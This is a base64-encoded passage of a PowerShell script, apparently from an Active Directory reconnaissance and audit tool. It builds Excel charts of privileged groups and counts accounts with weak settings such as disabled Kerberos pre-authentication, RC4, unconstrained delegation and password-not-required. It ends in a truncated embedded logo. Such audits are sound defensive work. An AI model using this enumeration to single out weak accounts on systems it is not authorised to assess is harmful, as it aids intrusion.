AgICAgICBUcnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkd29ya3NoZWV0LlBpdm90VGFibGVzKCRQaXZvdFRhYmxlTmFtZSkuUGl2b3RGaWVsZHMoIkdyb3VwIE5hbWUiKS5QaXZvdEl0ZW1zKCRfKS5WaXNpYmxlID0gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIyB3aGVuIFBpdm90SXRlbSBpcyBub3QgZm91bmQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy92YmEvZXhjZWwtdmJhL2FydGljbGVzL3hsc29ydG9yZGVyLWVudW1lcmF0aW9uLWV4Y2VsCiAgICAgICAgICAgICR3b3Jrc2hlZXQuUGl2b3RUYWJsZXMoJFBpdm90VGFibGVOYW1lKS5QaXZvdEZpZWxkcygiR3JvdXAgTmFtZSIpLkF1dG9Tb3J0KFtNaWNyb3NvZnQuT2ZmaWNlLkludGVyb3AuRXhjZWwuWGxTb3J0T3JkZXJdOjp4bERlc2NlbmRpbmcsIkNvdW50IChOb3QtUmVjdXJzaXZlKSIpCgogICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oMywxKS5JbnRlcmlvci5Db2xvckluZGV4ID0gNQogICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oMywxKS5mb250LkNvbG9ySW5kZXggPSAyCgogICAgICAgICAgICAkZXhjZWwuU2NyZWVuVXBkYXRpbmcgPSAkdHJ1ZQoKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsQ2hhcnQgLUNoYXJ0VHlwZSAieGxDb2x1bW5DbHVzdGVyZWQiIC1DaGFydExheW91dCAxMCAtQ2hhcnRUaXRsZSAiUHJpdmlsZWdlZCBHcm91cHMgaW4gQUQiIC1SYW5nZXRvQ292ZXIgIkQyOlAxNiIgLVN0YXJ0Um93ICJBMyIgLVN0YXJ0Q29sdW1uICJCMyIKICAgICAgICAgICAgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5IeXBlcmxpbmtzLkFkZCgkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkNlbGxzLkl0ZW0oMSw0KSAsICIiICwgIidHcm91cCBNZW1iZXJzJyFBMSIsICIiLCAiUmF3IERhdGEiKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRleGNlbC5XaW5kb3dzLkl0ZW0oMSkuRGlzcGxheWdyaWRsaW5lcyA9ICRmYWxzZQoKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICR3b3Jrc2hlZXQKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIHdvcmtzaGVldAogICAgICAgIH0KCiAgICAgICAgIyBDb21wdXRlciBTdGF0cwogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdDb21wdXRlcnMuY3N2JykKICAgICAgICBJZiAoVGVzdC1QYXRoICRBREZpbGVOYW1lKQogICAgICAgIHsKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsV29ya2Jvb2sgLU5hbWUgIkNvbXB1dGVyIFN0YXRzIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQoKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICAgICAkT2JqQXR0cmlidXRlcy5BZGQoIkRlbGVnYXRpb24gVHlwIiwnIlVuY29uc3RyYWluZWQiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJEZWxlZ2F0aW9uIFR5cGUiLCciQ29uc3RyYWluZWQiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJTSURIaXN0b3J5IiwnIioiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJEb3JtYW50IiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJQYXNzd29yZCBBZ2UgKD4gIiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJtcy1kcy1DcmVhdG9yU2lkIiwnIioiJykKCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEF0dHJpYnV0ZVN0YXRzIC1TcmNTaGVldE5hbWUgIkNvbXB1dGVycyIgLVRpdGxlMSAiQ29tcHV0ZXIgQWNjb3VudHMgaW4gQUQiIC1UaXRsZTIgIlN0YXR1cyBvZiBDb21wdXRlciBBY2NvdW50cyIgLU9iakF0dHJpYnV0ZXMgJE9iakF0dHJpYnV0ZXMKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIE9iakF0dHJpYnV0ZXMKCiAgICAgICAgICAgIEdldC1BRFJFeGNlbENoYXJ0IC1DaGFydFR5cGUgInhsUGllIiAtQ2hhcnRMYXlvdXQgMyAtQ2hhcnRUaXRsZSAiQ29tcHV0ZXIgQWNjb3VudHMgaW4gQUQiIC1SYW5nZXRvQ292ZXIgIkExMTpEMjMiIC1DaGFydERhdGEgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5SYW5nZSgiQTM6QTQsQjM6QjQiKQogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgxMCwxKSAsICIiICwgIkNvbXB1dGVycyFBMSIsICIiLCAiUmF3IERhdGEiKSB8IE91dC1OdWxsCgogICAgICAgICAgICBHZXQtQURSRXhjZWxDaGFydCAtQ2hhcnRUeXBlICJ4bEJhckNsdXN0ZXJlZCIgLUNoYXJ0TGF5b3V0IDEgLUNoYXJ0VGl0bGUgIlN0YXR1cyBvZiBDb21wdXRlciBBY2NvdW50cyIgLVJhbmdldG9Db3ZlciAiRjExOkwyMyIgLUNoYXJ0RGF0YSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLlJhbmdlKCJGMjpGOCxHMjpHOCIpCiAgICAgICAgICAgICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuSHlwZXJsaW5rcy5BZGQoJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5DZWxscy5JdGVtKDEwLDYpICwgIiIgLCAiQ29tcHV0ZXJzIUExIiwgIiIsICJSYXcgRGF0YSIpIHwgT3V0LU51bGwKCiAgICAgICAgICAgICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuVXNlZFJhbmdlLkVudGlyZUNvbHVtbi5BdXRvRml0KCkgfCBPdXQtTnVsbAogICAgICAgICAgICAkZXhjZWwuV2luZG93cy5JdGVtKDEpLkRpc3BsYXlncmlkbGluZXMgPSAkZmFsc2UKICAgICAgICB9CgogICAgICAgICMgVXNlciBTdGF0cwogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdVc2Vycy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiVXNlciBTdGF0cyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJNdXN0IENoYW5nZSBQYXNzd29yZCBhdCBMb2dvbiIsJyJUUlVFIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiQ2Fubm90IENoYW5nZSBQYXNzd29yZCIsJyJUUlVFIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiUGFzc3dvcmQgTmV2ZXIgRXhwaXJlcyIsJyJUUlVFIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiUmV2ZXJzaWJsZSBQYXNzd29yZCBFbmNyeXB0aW9uIiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJTbWFydGNhcmQgTG9nb24gUmVxdWlyZWQiLCciVFJVRSInKQogICAgICAgICAgICAkT2JqQXR0cmlidXRlcy5BZGQoIkRlbGVnYXRpb24gUGVybWl0dGVkIiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJLZXJiZXJvcyBERVMgT25seSIsJyJUUlVFIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiS2VyYmVyb3MgUkM0IiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJEb2VzIE5vdCBSZXF1aXJlIFByZSBBdXRoIiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJQYXNzd29yZCBBZ2UgKD4gIiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJBY2NvdW50IExvY2tlZCBPdXQiLCciVFJVRSInKQogICAgICAgICAgICAkT2JqQXR0cmlidXRlcy5BZGQoIk5ldmVyIExvZ2dlZCBpbiIsJyJUUlVFIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiRG9ybWFudCIsJyJUUlVFIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiUGFzc3dvcmQgTm90IFJlcXVpcmVkIiwnIlRSVUUiJykKICAgICAgICAgICAgJE9iakF0dHJpYnV0ZXMuQWRkKCJEZWxlZ2F0aW9uIFR5cCIsJyJVbmNvbnN0cmFpbmVkIicpCiAgICAgICAgICAgICRPYmpBdHRyaWJ1dGVzLkFkZCgiU0lESGlzdG9yeSIsJyIqIicpCgogICAgICAgICAgICBHZXQtQURSRXhjZWxBdHRyaWJ1dGVTdGF0cyAtU3JjU2hlZXROYW1lICJVc2VycyIgLVRpdGxlMSAiVXNlciBBY2NvdW50cyBpbiBBRCIgLVRpdGxlMiAiU3RhdHVzIG9mIFVzZXIgQWNjb3VudHMiIC1PYmpBdHRyaWJ1dGVzICRPYmpBdHRyaWJ1dGVzCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBPYmpBdHRyaWJ1dGVzCgogICAgICAgICAgICBHZXQtQURSRXhjZWxDaGFydCAtQ2hhcnRUeXBlICJ4bFBpZSIgLUNoYXJ0TGF5b3V0IDMgLUNoYXJ0VGl0bGUgIlVzZXIgQWNjb3VudHMgaW4gQUQiIC1SYW5nZXRvQ292ZXIgIkEyMTpEMzMiIC1DaGFydERhdGEgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5SYW5nZSgiQTM6QTQsQjM6QjQiKQogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgyMCwxKSAsICIiICwgIlVzZXJzIUExIiwgIiIsICJSYXcgRGF0YSIpIHwgT3V0LU51bGwKCiAgICAgICAgICAgIEdldC1BRFJFeGNlbENoYXJ0IC1DaGFydFR5cGUgInhsQmFyQ2x1c3RlcmVkIiAtQ2hhcnRMYXlvdXQgMSAtQ2hhcnRUaXRsZSAiU3RhdHVzIG9mIFVzZXIgQWNjb3VudHMiIC1SYW5nZXRvQ292ZXIgIkYyMTpMNDMiIC1DaGFydERhdGEgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5SYW5nZSgiRjI6RjE4LEcyOkcxOCIpCiAgICAgICAgICAgICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuSHlwZXJsaW5rcy5BZGQoJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5DZWxscy5JdGVtKDIwLDYpICwgIiIgLCAiVXNlcnMhQTEiLCAiIiwgIlJhdyBEYXRhIikgfCBPdXQtTnVsbAoKICAgICAgICAgICAgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5Vc2VkUmFuZ2UuRW50aXJlQ29sdW1uLkF1dG9GaXQoKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRleGNlbC5XaW5kb3dzLkl0ZW0oMSkuRGlzcGxheWdyaWRsaW5lcyA9ICRmYWxzZQogICAgICAgIH0KCiAgICAgICAgIyBDcmVhdGUgVGFibGUgb2YgQ29udGVudHMKICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiVGFibGUgb2YgQ29udGVudHMiCiAgICAgICAgJHdvcmtzaGVldCA9ICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkKCiAgICAgICAgJGV4Y2VsLlNjcmVlblVwZGF0aW5nID0gJGZhbHNlCiAgICAgICAgIyBJbWFnZSBmb3JtYXQgYW5kIHByb3BlcnRpZXMKICAgICAgICAjICRwYXRoID0gIkM6XFNPU19Mb2dvLmpwZyIKICAgICAgICAjICRiYXNlNjRzb3MgPSBbY29udmVydF06OlRvQmFzZTY0U3RyaW5nKChHZXQtQ29udGVudCAkcGF0aCAtRW5jb2RpbmcgYnl0ZSkpCgogICAgICAgICRiYXNlNjRzb3MgPSAiLzlqLzRBQVFTa1pKUmdBQkFnRUFTQUJJQUFELzdRQXNVR2h2ZEc5emFHOXdJRE11TUFBNFFrbE5BKzBBQUFBQUFCQUFTQUFBQUFFQUFRQklBQUFBQVFBQi8rRmlrMmgwZEhBNkx5OXVjeTVoWkc5aVpTNWpiMjB2ZUdGd0x6RXVNQzhBUEQ5NGNHRmphMlYwSUdKbFoybHVQU0x2dTc4aUlHbGtQU0pYTlUwd1RYQkRaV2hwU0hweVpWTjZUbFJqZW10ak9XUWlQejRLUEhnNmVHMXdiV1YwWVNCNGJXeHVjenA0UFNKaFpHOWlaVHB1Y3pwdFpYUmhMeUlnZURwNGJYQjBhejBpUVdSdlltVWdXRTFRSUVOdmNtVWdOQzR5TGpJdFl6QTJNeUExTXk0ek5URTNNelVzSURJd01EZ3ZNRGN2TWpJdE1UZzZNVEU2TVRJZ0lDQWdJQ0FnSUNJK0NpQWdJRHh5WkdZNlVrUkdJSGh0Ykc1ek9uSmtaajBpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2TVRrNU9TOHdNaTh5TWkxeVpHWXRjM2x1ZEdGNExXNXpJeUkrQ2lBZ0lDQWdJRHh5WkdZNlJHVnpZM0pwY0hScGIyNGdjbVJtT21GaWIzVjBQU0lpQ2lBZ0lDQWdJQ0FnSUNBZ0lIaHRiRzV6T21SalBTSm9kSFJ3T2k4dmNIVnliQzV2Y21jdlpHTXZaV3hsYldWdWRITXZNUzR4THlJK0NpQWdJQ0FnSUNBZ0lEeGtZenBtYjNKdFlYUSthVzFoWjJVdmFuQmxaend2WkdNNlptOXliV0YwUGdvZ0lDQWdJQ0E4TDNKa1pqcEVaWE5qY21sd2RHbHZiajRLSUNBZ0lDQWdQSEprWmpwRVpYTmpjbWx3ZEdsdmJpQnlaR1k2WVdKdmRYUTlJaUlLSUNBZ0lDQWdJQ0FnSUNBZ2VHMXNibk02ZUcxd1BTSm9kSFJ3T2k4dmJuTXVZV1J2WW1VdVkyOXRMM2hoY0M4eExqQXZJZ29nSUNBZ0lDQWdJQ0FnSUNCNGJXeHVjenA0YlhCSFNXMW5QU0pvZEhSd09pOHZibk11WVdSdlltVXVZMjl0TDNoaGNDOHhMakF2Wnk5cGJXY3ZJajRLSUNBZ0lDQWdJQ0FnUEhodGNEcE5aWFJoWkdGMFlVUmhkR1UrTWpBeE15MHhNQzB3TTFReE1Ub3lOam95TlNzeE1Eb3dNRHd2ZUcxd09rMWxkR0ZrWVhSaFJHRjBaVDRLSUNBZ0lDQWdJQ0FnUEhodGNEcE5iMlJwWm5sRVlYUmxQakl3TVRNdE1UQXRNRE5VTURFNk1qWTZNekJhUEM5NGJYQTZUVzlrYVdaNVJHRjBaVDRLSUNBZ0lDQWdJQ0FnUEhodGNEcERjbVZoZEdWRVlYUmxQakl3TVRNdE1UQXRNRE5VTVRFNk1qWTZNalVyTVRBNk1EQThMM2h0Y0RwRGNtVmhkR1ZFWVhSbFBnb2dJQ0FnSUNBZ0lDQThlRzF3T2tOeVpXRjBiM0pVYjI5c1BrRmtiMkpsSUVsc2JIVnpkSEpoZEc5eUlFTlRORHd2ZUcxd09rTnlaV0YwYjNKVWIyOXNQZ29nSUNBZ0lDQWdJQ0E4ZUcxd09sUm9kVzFpYm1GcGJITStDaUFnSUNBZ0lDQWdJQ0FnSUR4eVpHWTZRV3gwUGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4Y21SbU9teHBJSEprWmpwd1lYSnpaVlI1Y0dVOUlsSmxjMjkxY21ObElqNEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSGh0Y0VkSmJXYzZkMmxrZEdnK01qVTJQQzk0YlhCSFNXMW5PbmRwWkhSb1Bnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThlRzF3UjBsdFp6cG9aV2xuYUhRK09UWThMM2h0Y0VkSmJXYzZhR1ZwWjJoMFBnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThlRzF3UjBsdFp6cG1iM0p0WVhRK1NsQkZSend2ZUcxd1IwbHRaenBtYjNKdFlYUStDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRHg0YlhCSFNXMW5PbWx0WVdkbFBpODVhaTgwUVVGUlUydGFTbEpuUVVKQlowVkNURUZGYzBGQlJDODNVVUZ6VlVkb2RtUkhPWHBoUnpsM1NVUk5kVTFCUVRSUmEyeE9RU3N3UVVGQlFVRkJRa0ZDVEVGQlFVRkJSVUVtSTNoQk8wRlJSWE5CUVVGQlFWRkJRaThyTkVGRWEwWnJZakpLYkVGSFZFRkJRVUZCUVdZdllrRkpVVUZDWjFGRlFrRlZSVUpuVlVaQ1oydEhRbEZaU2tOM1owZENaMmRNUkVGdlMwTjNiMHNtSTNoQk8wUkNRVTFFUVhkTlJFRjNVVVJCTkZCRlFUaFBSRUpOVkVaQ1VWUkZlSGRpUjNoelkwaDRPR1pJZURobVNIZzRaa2gzUlVoQ2QyTk9SRUV3V1VWQ1FWbEhhRlZTUmxKdlpraDRPR1ltSTNoQk8waDRPR1pJZURobVNIZzRaa2g0T0daSWVEaG1TSGc0WmtoNE9HWkllRGhtU0hnNFpraDRPR1pJZURobVNIZzRaa2g0T0daSWVEaG1TSGc0Wmk4NFFVRkZVV2RCV1VGRlFVRjNSVkltSTNoQk8wRkJTVkpCVVUxU1FXWXZSVUZoU1VGQlFVRklRVkZGUWtGUlJVRkJRVUZCUVVGQlFVRkJVVVpCZDBsSFFWRkJTRU5CYTB0RGQwVkJRV2RKUkVGUlJVSkJVVVZCUVVGQlFVRkJRVUVtSTNoQk8wRlJRVU5CZDFGR1FtZGpTVU5SYjB4RlFVRkRRVkZOUkVGblVVTkNaMk5FUWtGSlIwRnVUVUpCWjAxU1FrRkJSa2xTU1hoUlZrVkhSVEpGYVdOWlJWVk5jRWRvUW5oWGVGRnBVRUltSTNoQk8xVjBTR2hOZUZwcE9FTlNlV2QyUld4UmVsSlVhM0ZMZVZrelVFTk9WVkZ1YXpaUGVrNW9aRlZhU0ZSRU1IVkpTVXB2VFVwRGFHZGFhRXBTUmxKeFV6QldkRTVXUzBKeWVUUXZVRVVtSTNoQk96RlBWREJhV0ZkR2JHRlhNWGhrV0d3NVYxb3lhSEJoYlhSellsYzFkbGt6VWpGa2JtUTBaVmh3TjJaSU1TdG1NMDlGYUZsaFNHbEpiVXRwTkhsT2FtOHJRMnMxVTFac2NHVlpiVm9tSTNoQk8zRmlia295Wlc0MVMycHdTMWR0Y0RacGNIRnhkWE55WVRaMmIxSkJRVWxEUVZGSlJFSlJWVVZDVVZsRlEwRk5SR0pSUlVGQmFFVkVRa05GVTAxVlJVWlZVazVvU1dkYWVHZGFSWGttSTNoQk8yOWlTSGRHVFVoU05GTk9RMFpXU21samRrVjZTa1JTUkdkb1lWTlZlVmRwV1RkTVEwSXpVRk5PWlVwRlozaGtWV3QzWjBwRGFHZGFTbXBhUmtkcFpHdGtSbFV6T0hGUGVuZDVaM0FtSTNoQk96QXJVSHBvU2xOcmRFMVVWVFZRVW14a1dWZFdjR0pZUmpGbFdERlNiRnB0Wkc5aFYzQnlZa2N4ZFdJeVVqRmtibVEwWlZod04yWklNU3RtTTA5RmFGbGhTR2xKYlV0cE5IbE9hbThtSTNoQk95dEViRXBYVjJ3MWFWcHRjSFZqYmxvMlptdHhUMnR3WVdGdWNVdHRjWEUyZVhSeWNTdDJMMkZCUVhkRVFWRkJRMFZSVFZKQlJEaEJPVlUwY1RkR1ZYUTRlVU41WmxKTWNVTXJXR3dtSTNoQk8xb3pVM0poZWpsUWFGTTFXVkZzT1M4MVpXWk1OazFxVDBoRlEwODVkSGRhY0Zsd2VHNUlia1ZuTDBvNGIxaFdNelZyT0hZMmJtTTJZMnd2WkZkek9XcExPRVJEUjJGVFQyaHFZbW9tSTNoQk8xVmpVMDUyYUVaTk5TOWxTamRwSzNsWk9HVkVWVmw0VFhocVNWTkdOMmRJYlRrNUwwcEllbUprWVRjMVdHdDBOeXMwWlRVeFNGUndWRWhLVGt0NFpWSTBjRkJwYWxwdFNrcFFOMU1tSTNoQk96Y3JSMkpZVWxwVVMwcENOV2c0TnpseFQzbzBObVpWUTFWQlNYZHRUMUUxVjA5bU5rTTVSWHBPWldGa2FYSnpWbVJwY25OV1pHbHljMVprYVhKelZtUnBjbk5XWkdseWMxWmthWEltSTNoQk8zTldaR2x5YzFaa2FYSnpWbVJwY25OV1pHbHljMVprYVhKelZtUnBjbk5XWkdseWMxWlJUM1UyV1U1V01GUlZUazFNWTBKbVZ6QjBkbnB4VVZZNVZrTnVTVVZpYVd4aE4xbHhLMWttSTNoQk95OVFOV1pWTkdSR09ESkdRWE50ZERKbldGVldWVU5wWVdoYUwzVk1jRTUwZG5SeWJXNHhkVkJvYm1abEsyd3JlVTl6T0ZSVWJrZGxaVTB2V1dSNEsyeE5abmxST0hobWIyNTZka1FtSTNoQk8yRjVUbE15TVZaRVlYVlBNM0ZJTkc5cUwzZFJOQzlVYTA1S2F6Umpaemc1YmtrNWNVNUlOREpyVFdnNVYxQXhaa1J5SzNZMFVIQnVUaklyVjA5NFZqSkxkWGhXTWt0MWVGWXlTM1VtSTNoQk8zaFdNa3QxZUZZeVMzVjRWakpMZFhoV01rdDFlRll5UzNWNFZqSkxkWGhXTWt0MWVGWXlTM1Y0VmpKTGRYaFdNa3QxZUZZeVMzVjRWamcwWVhSd2RrODFMMDFZZVdGNVZXNHdZU3NtSTNoQk95OTNRVlEyVTFBcldHRTNWbGQxYkZndlNsRlRRUzlRVFZSWE5DdExSamw2TUVoemVuSlFRakZqVVdad2JqWlVLMm8zV0c1R2RHTlVWekY0Um1OUlRWVnRhR1JhU1c1SVZVMW9jWEFtSTNoQk95dG5hazVOSzNGVVowcFNUVlI1VERkRk9IUTJNVVJ5WldjeVIzSlJNRU5ZYTB0VGJGSXJlVFZJZUhJdlFVeEdjV3BQWjNoYVQwOUpURFJ5Y21STlkwZGhWMDB2ZDIxMk1VcHNiR29tSTNoQk8ybDFTa0ZDU2s1QlQzQjRWa0Z5Y20xclUxUXZRVVpsUnpacWRVcDNZVTVHUVdaWFdtRXZlbWxRYTFaSWRUSldaVTVETmtKMk0ySjFVV1JNYTBFMGFrVm5aV1V6ZVhadGRuTTVXREFtSTNoQk8zRXJiblZNWlhsMlNXSnRaVEJMYVRacWFHdFhVbTlwT1dWSlkwdFVlRW8wYmxrMVlUUTJNMWQwWVRCMlVrNU1kVTVXTVZNMFZ6RnpURkpQWXpnM01XOUNNRFpEY0VwS01rRkhOVThtSTNoQk8wdDJRamxqTHpWNU1HZFRObVZRVVRsQ1RURnpjRzlzZUdSNlpXMTZZamxtVTFKWE5DOTNSRUkwY0hCSFpWWXZLMk54WWtoVlpGUm5jMDVXTUVOWE1pdHplVXBHUms1aFZFTTBVRXNtSTNoQk8xSm5jV2Q0YzJ0YU5tNXplQ3RYUzB0bE9EUnhOMFpZV1hFM1JsaFpjVGRHV0ZseE4wWllXWEUzUmxoWmNUZEdXRmx4TjBaWVdYRTNSbGhaY1RkR1dGbHhOMFpZV1hFM1JsaG5aalVtSTNoQk8zSXpVMlZXVUhvek9IQmxXWEJTVkZSMFkzUnRNSFpWYkhCV1dGRjFXWEJETTJsR1Z6UnFZaTlCUjA5QmFYaFNXbEpyVVdKSVRVMVNPSGN2YkdRMWVEQTNWa3g1UnpJd2FUZDFOMHNtSTNoQk8wdGFNWFJ3TkZsdGJEVjRhSFpuWVdsQmJtUmhaSE13VlhORmQyRnZMMG81WVRCbVluVnNlVFEwYlZkVFRWcEZRM2RVVmtoeWVscFdOVU00T1N0akwweGxhV3A1TjBJMVlYVnlLelltSTNoQk96bGFOVXhZYld0eFkwVmxhRXRzUWtkVFVubHhNV0ZxY214MVNGVlVaMDlGUTNvclQycHhaVEYxZVhSTWNYTjJhbTVPUjBWaE16VkhOamczTjJzeU1YcDZkalUxY3pScVRqVnlPSGdtSTNoQk8yRllOVXgwTWtabWNYTmhjbU16ZUZoeU9FVkJUVGhvTWpoRFRYbG5UVGdyV2pSUk5reEtVSE55VkRkUmFsQlFUSHBPUkRsSU0wWTFialZvTDFCTWVYUkVlbE4zZEdSUk9ERXpibUVtSTNoQk96a3hLelJrWWxGSUwwbHpiMjF2ZVdWNlJWcGFTRk5TTDJsS2EyWk9kMDF1WWxkVWJHbHFSRU5RTmtsR0wzZERiVFYyVUdaTmJqVjFaV1prWm1oT2NHTmhhekZ1Y0haU1RrMHdPVkltSTNoQk8yRlhlWEl2VERaalVFaHJVRGxqYmsxeFRWRkNVVEprVkU5amNHMDFSV3NyWWpaRUwwRlBZMUpPVUUxWWExaFdjalZvVVROWGNFNUhjRGhXYUdocWIyWXJRMnRpUTNkTVdDOVBWMVltSTNoQk96bGxVbVZYT1VWek5ESmFZbGMxZFRWSWRVRkxNRXhTVW1vd2QyWXJSRmt3ZUZGRmNDOTNRMk5pWmtsWWExQllaa3h0YjJGb2NURnVRbkZ0Y1hCa1IwWTBUR2RDZUVSRFJWWnJTV29tSTNoQk8wOHplR3QwT0ZaUE1VOTRlRk5ZY0M4dlMydFFlVGhwT0hnMlluSTVhSEF2TmxCMlRrOXRSbmR6Vm5ONFYwZFNhMEkwWTI5NmVWVmpWMjkzTkZVMldXOWFORGR3UjJwVFUwMUZVa0VtSTNoQk8xZGFiVTVCUVU1NVUxUnBjbnBRVnk4clkybDJlWGN3Y1RoaE1FWTNUbkZFZUc1cVNUbHNSVnBKZDFJMFUwMVZWblp0Y0VsNFZraGxWbEI2TUM5TWFucE1aWEJaTW0xdlRtRllNSEFtSTNoQk96UjNNamsyYUdoTWF6bEJjakZoVFdzNWFIbHhaVEpMYzI0NE1pdGhPVWs0Y1RaS1RuSlhjbk0yVjAxRVNYTnFVbkZZWVhOcVFrWXJSV1UxZUZacGVDOVFiamh6YkRoMmNISmlZVzBtSTNoQk8xWm5hMnRsUjA4eE9VNXFZM000WkVOM09VbFdTVVpIUWpWSVltWnlhWEZXTWtndlQxTXZOVmd6Vm5sclJXczVNMXB4TlhBMk9EbDFabFJJZWpsT2NFY3ZSRVpZY1Vad1pESjBOV0VtSTNoQk8zaFlWbkJMYXpsMFQyOXJhRzFxV1UxcWIzZHhSMVpvYzFGalZtVmxaVmwySzJObmRua3dNRThyWlhobEsydDJOMmxKT0ZwMmNVMW1jVzl5UkhGUVZVcFNSRlF2UVVOVFkxWldVRXdtSTNoQk8wZzFPUzlzZGpWb01VTklWSEpoT1d4MFlqSTFaRmx5WVVjM2FXRlFNVWhqT0ZaV1dGaHRiRk5VVVVGelRWWmFOMlpZT1d4d09XNU1aVE13T0dSeVlWRkxXRzExU2xkRFNXbHFkWG9tSTNoQk8wNVJSRVpZYlU0dkwzZEJOVXd2YkdaaFdFeDNVbm96WkRSeFIyNXlNamwxWmxSS1NHZGFSMnBLS3pkR1YxTmxWRkI2WWpocFpXSTFkbkV5YTJGblVISTVRek14UnpSVmQzcEZSR01tSTNoQk96aFJNbm93TnpoRFkxWmFhbWx5YzFaWkx6VXdPRGtyVnk5S2RXMU1jVTkxTTBKb2FXdG1NRFJKYTFWMlRFczVTemhWVldWQk5tczNXWEZ5SzFWMlRsWm9OVzh3YmpsTFYwMUdla0ltSTNoQk8ySnRVbTluYkRORldWcExjVUZUWlVwS01qTTJOSEZ1VDB0MWVGWXlTM1JOZVhGd1dtbEJiMFpUVkhOQlFtbHllak42WkN0bWJqVmFaVmRsWTFVeWNYSnhSalpzWmpsRU1EaEROR1ltSTNoQk8ydFFNbE0yYTFKTFpscHVSMHQyUm1aT015OVBWek50YVRrMWQyVlhUazlvTUcxRk4weGtXRVpNYlRRcldWVm5Va3c0YVhKWmNIQTFOelZaTVhwNlVEVXhMMDEyZVRKdGR